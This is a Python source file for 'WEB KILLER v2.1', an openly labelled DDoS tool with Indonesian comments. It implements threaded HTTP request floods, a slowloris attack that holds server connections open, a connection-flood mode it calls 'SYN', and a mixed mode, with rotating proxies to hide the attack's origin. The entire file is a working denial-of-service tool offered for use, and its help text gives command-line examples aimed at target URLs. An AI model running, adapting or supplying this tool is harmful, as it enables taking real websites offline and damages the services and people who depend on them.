# -*- coding: utf-8 -*-
#!/usr/bin/env python3
"""
WEB KILLER v2.1 - CPA Advanced Web Flood Tool
"""

import sys
import os
import threading
import random
import requests
import time
import socket
import ssl
import urllib.parse
import warnings
import urllib3
from threading import Event
from collections import defaultdict

# Nonaktifkan warning
warnings.filterwarnings('ignore')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    END = '\033[0m'

VERSION = "2.1"
BANNER = f"""
{Colors.RED}
╔══════════════════════════════════════════════════════════════╗
║   WEB KILLER v{VERSION} URL FLOODER                                ║
║   CPA TOOLS DEVELOPMENT                                      ║
╚══════════════════════════════════════════════════════════════╝
{Colors.END}"""

class Config:
    target_url = ''
    target_ip = ''
    target_port = 80
    use_https = False
    threads = 50
    timeout = 5
    duration = 0
    method = 'GET'
    attack_type = 'http'
    use_proxy = False
    proxy_file = 'proxy.txt'
    verbose = False
    delay = 0.1
    custom_headers = {}
    post_data = None
    cookies = {}
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
    ]

# Statistik - Gunakan dua dictionary terpisah
stats = {
    'total_requests': 0,
    'success': 0,
    'failed': 0,
    'start_time': 0,
    'connections': 0,
}
status_codes = {}  # Gunakan dictionary biasa, bukan defaultdict
status_lock = threading.Lock()

lock = threading.Lock()
stop_event = Event()
proxies = []
current_proxy_index = 0

class WebKiller:
    def __init__(self):
        self.config = Config()
        self.running = False
        self.threads = []
        
    def parse_args(self):
        try:
            import getopt
            opts, args = getopt.getopt(sys.argv[1:], 'u:t:p:d:m:a:o:v:h',
                ['url=', 'threads=', 'timeout=', 'duration=', 'method=',
                 'attack=', 'proxy', 'verbose', 'delay=', 'data=',
                 'header=', 'cookie=', 'help'])
        except getopt.GetoptError as e:
            print(f"{Colors.RED}Error: {e}{Colors.END}")
            self.show_help()
            sys.exit(1)
            
        for opt, arg in opts:
            if opt in ('-h', '--help'):
                self.show_help()
                sys.exit(0)
            elif opt in ('-u', '--url'):
                self.config.target_url = arg
            elif opt in ('-t', '--threads'):
                self.config.threads = int(arg)
            elif opt in ('--timeout'):
                self.config.timeout = int(arg)
            elif opt in ('-d', '--duration'):
                self.config.duration = int(arg)
            elif opt in ('-m', '--method'):
                self.config.method = arg.upper()
            elif opt in ('-a', '--attack'):
                self.config.attack_type = arg.lower()
            elif opt == '--proxy':
                self.config.use_proxy = True
            elif opt in ('-v', '--verbose'):
                self.config.verbose = True
            elif opt == '--delay':
                self.config.delay = float(arg)
            elif opt == '--data':
                self.config.post_data = arg
            elif opt == '--header':
                key, val = arg.split(':', 1)
                self.config.custom_headers[key.strip()] = val.strip()
            elif opt == '--cookie':
                for cookie in arg.split(';'):
                    if '=' in cookie:
                        key, val = cookie.split('=', 1)
                        self.config.cookies[key.strip()] = val.strip()
                
        if not self.config.target_url:
            print(f"{Colors.RED}Error: URL is required!{Colors.END}")
            self.show_help()
            sys.exit(1)
            
        parsed = urllib.parse.urlparse(self.config.target_url)
        self.config.target_ip = parsed.hostname
        self.config.target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        self.config.use_https = parsed.scheme == 'https'
        
        if self.config.use_proxy:
            self.load_proxies()
            
    def load_proxies(self):
        global proxies
        try:
            if os.path.exists(self.config.proxy_file):
                with open(self.config.proxy_file, 'r') as f:
                    proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                print(f"{Colors.GREEN}✓ Loaded {len(proxies)} proxies{Colors.END}")
            else:
                print(f"{Colors.YELLOW}⚠ Proxy file not found{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}✗ Error loading proxies: {e}{Colors.END}")
            
    def get_proxy(self):
        global proxies, current_proxy_index
        if not proxies:
            return None
        proxy = proxies[current_proxy_index % len(proxies)]
        current_proxy_index += 1
        return {
            'http': f'http://{proxy}',
            'https': f'http://{proxy}'
        }
        
    def get_headers(self):
        headers = {
            'User-Agent': random.choice(self.config.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
        }
        headers.update(self.config.custom_headers)
        if self.config.cookies:
            headers['Cookie'] = '; '.join([f'{k}={v}' for k, v in self.config.cookies.items()])
        return headers
        
    def update_status_code(self, code):
        """Update status code dengan aman"""
        global status_codes
        with status_lock:
            if isinstance(code, int):
                code_str = str(code)
            else:
                code_str = str(code)
            status_codes[code_str] = status_codes.get(code_str, 0) + 1
        
    def http_attack(self, thread_id):
        session = requests.Session()
        
        while not stop_event.is_set():
            try:
                headers = self.get_headers()
                proxy = self.get_proxy() if self.config.use_proxy else None
                
                url = self.config.target_url
                if '?' not in url:
                    url += '?'
                url += f'&_={random.randint(1, 999999)}'
                
                req_kwargs = {
                    'headers': headers,
                    'proxies': proxy,
                    'timeout': self.config.timeout,
                    'verify': False,
                    'allow_redirects': False,
                }
                
                if self.config.method in ['POST', 'PUT', 'PATCH'] and self.config.post_data:
                    req_kwargs['data'] = self.config.post_data
                    
                if self.config.method == 'GET':
                    r = session.get(url, **req_kwargs)
                elif self.config.method == 'POST':
                    r = session.post(url, **req_kwargs)
                else:
                    r = session.request(self.config.method, url, **req_kwargs)
                
                with lock:
                    stats['total_requests'] += 1
                    if 200 <= r.status_code < 400:
                        stats['success'] += 1
                    else:
                        stats['failed'] += 1
                
                # Update status code dengan aman
                self.update_status_code(r.status_code)
                
                if self.config.verbose:
                    print(f"{Colors.DIM}[{thread_id}] {r.status_code}{Colors.END}")
                    
                time.sleep(self.config.delay + random.uniform(0, 0.05))
                
            except requests.exceptions.Timeout:
                with lock:
                    stats['total_requests'] += 1
                    stats['failed'] += 1
                self.update_status_code('TIMEOUT')
                if self.config.verbose:
                    print(f"{Colors.YELLOW}[{thread_id}] TIMEOUT{Colors.END}")
                    
            except requests.exceptions.ConnectionError:
                with lock:
                    stats['total_requests'] += 1
                    stats['failed'] += 1
                self.update_status_code('CONN_ERR')
                if self.config.verbose:
                    print(f"{Colors.RED}[{thread_id}] CONNECTION ERROR{Colors.END}")
                    
            except Exception as e:
                with lock:
                    stats['total_requests'] += 1
                    stats['failed'] += 1
                self.update_status_code('ERROR')
                if self.config.verbose:
                    print(f"{Colors.RED}[{thread_id}] ERROR: {str(e)[:30]}{Colors.END}")
                    
    def slowloris_attack(self, thread_id):
        sockets = []
        while not stop_event.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                
                if self.config.use_https:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=self.config.target_ip)
                    
                sock.connect((self.config.target_ip, self.config.target_port))
                
                headers = [
                    f"GET /?{random.randint(0, 9999)} HTTP/1.1",
                    f"Host: {self.config.target_ip}",
                    f"User-Agent: {random.choice(self.config.user_agents)}",
                    "Connection: keep-alive",
                ]
                
                for _ in range(random.randint(5, 15)):
                    headers.append(f"X-{random.randint(1,999)}: {random.randint(1,999)}")
                    
                sock.send(('\r\n'.join(headers) + '\r\n').encode())
                sockets.append(sock)
                
                for s in sockets[:]:
                    try:
                        s.send(f"X-{random.randint(1,999)}: {random.randint(1,999)}\r\n".encode())
                    except:
                        sockets.remove(s)
                        
                if len(sockets) > self.config.threads * 2:
                    try:
                        sockets.pop(0).close()
                    except:
                        pass
                        
                with lock:
                    stats['connections'] += 1
                    
                time.sleep(random.uniform(5, 15))
                
            except Exception as e:
                if self.config.verbose:
                    print(f"{Colors.RED}[{thread_id}] SLOWLORIS ERROR{Colors.END}")
                time.sleep(1)
                
        for s in sockets:
            try:
                s.close()
            except:
                pass
                
    def syn_attack(self, thread_id):
        while not stop_event.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.config.target_ip, self.config.target_port))
                sock.send(b'SYN')
                sock.close()
                with lock:
                    stats['connections'] += 1
                time.sleep(self.config.delay)
            except Exception:
                pass
                
    def mixed_attack(self, thread_id):
        attacks = ['http', 'slowloris', 'syn']
        attack_functions = {
            'http': self.http_attack,
            'slowloris': self.slowloris_attack,
            'syn': self.syn_attack
        }
        while not stop_event.is_set():
            attack_type = random.choice(attacks)
            attack_functions[attack_type](thread_id)
            
    def start(self):
        print(f"\n{Colors.CYAN}🎯 Target: {Colors.WHITE}{self.config.target_url}{Colors.END}")
        print(f"{Colors.CYAN}🔧 Method: {Colors.WHITE}{self.config.method}{Colors.END}")
        print(f"{Colors.CYAN}💀 Attack: {Colors.WHITE}{self.config.attack_type.upper()}{Colors.END}")
        print(f"{Colors.CYAN}🧵 Threads: {Colors.WHITE}{self.config.threads}{Colors.END}")
        print(f"{Colors.CYAN}⏱️  Timeout: {Colors.WHITE}{self.config.timeout}s{Colors.END}")
        if self.config.duration > 0:
            print(f"{Colors.CYAN}⏰ Duration: {Colors.WHITE}{self.config.duration}s{Colors.END}")
        if self.config.use_proxy:
            print(f"{Colors.CYAN}🔒 Proxy: {Colors.WHITE}Enabled ({len(proxies)} proxies){Colors.END}")
        print(f"{Colors.YELLOW}⚠️  Press Ctrl+C to stop{Colors.END}\n")
        
        stats['start_time'] = time.time()
        self.running = True
        
        attack_func = {
            'http': self.http_attack,
            'slowloris': self.slowloris_attack,
            'syn': self.syn_attack,
            'mixed': self.mixed_attack
        }.get(self.config.attack_type, self.http_attack)
        
        for i in range(self.config.threads):
            t = threading.Thread(target=attack_func, args=(i,))
            t.daemon = True
            t.start()
            self.threads.append(t)
            
        try:
            while not stop_event.is_set():
                if self.config.duration > 0 and time.time() - stats['start_time'] > self.config.duration:
                    break
                time.sleep(5)
                self.show_stats()
        except KeyboardInterrupt:
            print(f"\n\n{Colors.YELLOW}🛑 Stopping...{Colors.END}")
            
        self.stop()
        
    def stop(self):
        stop_event.set()
        self.running = False
        for t in self.threads:
            t.join(timeout=1)
        self.show_final_stats()
        
    def show_stats(self):
        """Show statistics with safe status code display"""
        elapsed = time.time() - stats['start_time']
        with lock:
            print(f"\n{Colors.CYAN}━━━ STATISTICS ━━━{Colors.END}")
            print(f"{Colors.WHITE}Time: {Colors.GREEN}{elapsed:.1f}s{Colors.END}")
            print(f"{Colors.WHITE}Requests: {Colors.GREEN}{stats['total_requests']}{Colors.END}")
            print(f"{Colors.WHITE}Success: {Colors.GREEN}{stats['success']}{Colors.END}")
            print(f"{Colors.WHITE}Failed: {Colors.RED}{stats['failed']}{Colors.END}")
            if stats['total_requests'] > 0:
                rate = (stats['success'] / stats['total_requests']) * 100
                rps = stats['total_requests'] / elapsed if elapsed > 0 else 0
                print(f"{Colors.WHITE}Success Rate: {Colors.GREEN}{rate:.1f}%{Colors.END}")
                print(f"{Colors.WHITE}RPS: {Colors.GREEN}{rps:.1f}{Colors.END}")
            
            # Tampilkan status codes dengan aman
            if status_codes:
                print(f"{Colors.WHITE}Status Codes:{Colors.END}")
                # Sort by key, tapi pastikan semua string
                for code, count in sorted(status_codes.items(), key=lambda x: str(x[0])):
                    # Tentukan warna berdasarkan kode
                    if code in ['TIMEOUT', 'CONN_ERR', 'ERROR']:
                        color = Colors.RED
                    elif code.isdigit():
                        code_int = int(code)
                        if 200 <= code_int < 300:
                            color = Colors.GREEN
                        elif 300 <= code_int < 400:
                            color = Colors.BLUE
                        else:
                            color = Colors.YELLOW
                    else:
                        color = Colors.YELLOW
                    print(f"  {color}{code}: {count}{Colors.END}")
                    
    def show_final_stats(self):
        """Show final statistics with safe status code display"""
        elapsed = time.time() - stats['start_time']
        print(f"\n{Colors.CYAN}━━━ FINAL STATISTICS ━━━{Colors.END}")
        print(f"{Colors.WHITE}Total Time: {Colors.GREEN}{elapsed:.1f}s{Colors.END}")
        print(f"{Colors.WHITE}Total Requests: {Colors.GREEN}{stats['total_requests']}{Colors.END}")
        print(f"{Colors.WHITE}Successful: {Colors.GREEN}{stats['success']}{Colors.END}")
        print(f"{Colors.WHITE}Failed: {Colors.RED}{stats['failed']}{Colors.END}")
        print(f"{Colors.WHITE}Connections: {Colors.GREEN}{stats['connections']}{Colors.END}")
        if stats['total_requests'] > 0:
            rate = (stats['success'] / stats['total_requests']) * 100
            rps = stats['total_requests'] / elapsed if elapsed > 0 else 0
            print(f"{Colors.WHITE}Success Rate: {Colors.GREEN}{rate:.1f}%{Colors.END}")
            print(f"{Colors.WHITE}Average RPS: {Colors.GREEN}{rps:.1f}{Colors.END}")
        
        # Tampilkan status codes dengan aman
        if status_codes:
            print(f"{Colors.WHITE}Status Code Distribution:{Colors.END}")
            for code, count in sorted(status_codes.items(), key=lambda x: str(x[0])):
                if code in ['TIMEOUT', 'CONN_ERR', 'ERROR']:
                    color = Colors.RED
                elif code.isdigit():
                    code_int = int(code)
                    if 200 <= code_int < 300:
                        color = Colors.GREEN
                    elif 300 <= code_int < 400:
                        color = Colors.BLUE
                    else:
                        color = Colors.YELLOW
                else:
                    color = Colors.YELLOW
                print(f"  {color}{code}: {count}{Colors.END}")
        print(f"\n{Colors.GREEN}✅ Web Killer Stopped!{Colors.END}\n")
        
    def show_help(self):
        print(f"""
{Colors.CYAN}WEB KILLER v{VERSION} - CYBER POEPLE ATTACK Tool{Colors.END}

{Colors.GREEN}Usage:{Colors.END}
  python webkiller.py --url <URL> [options]

{Colors.GREEN}Options:{Colors.END}
  -u, --url <URL>          Target URL
  -t, --threads <NUM>      Threads (default: 50)
  --timeout <SEC>          Timeout (default: 5)
  -d, --duration <SEC>     Duration (0 = unlimited)
  -m, --method <METHOD>    HTTP method
  -a, --attack <TYPE>      http, slowloris, syn, mixed
  --proxy                  Use proxies
  --delay <SEC>            Delay between requests
  --data <DATA>            POST data
  --header <H>             Custom header
  --cookie <C>             Cookies
  -v, --verbose            Verbose output
  -h, --help               Show help

{Colors.GREEN}Examples:{Colors.END}
  python webkiller.py --url https://example.com --threads 100
  python webkiller.py --url https://example.com --attack mixed --threads 50 --duration 30
  python webkiller.py --url https://example.com --method POST --data "key=value"
{Colors.END}""")

def main():
    print(BANNER)
    print(f"{Colors.CYAN}📍 CYBER POEPLE ATTACK DDoS TOOL{Colors.END}\n")
    
    killer = WebKiller()
    killer.parse_args()
    killer.start()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Interrupted{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}Fatal Error: {e}{Colors.END}")
        sys.exit(1)
